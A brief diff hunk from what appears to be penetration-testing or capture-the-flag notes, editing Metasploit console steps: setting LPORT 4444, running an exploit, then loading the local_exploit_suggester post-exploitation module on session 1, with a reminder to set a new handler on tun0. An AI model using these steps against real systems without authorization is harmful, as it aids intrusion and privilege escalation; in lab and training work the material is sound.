@@ -48,6 +48,6 @@ set LPORT 4444
 exploit
 use post/multi/recon/local_exploit_suggester
 set session 1
-run
+exploit
 #don't forget to set new handler to tun0 and new port
 ```
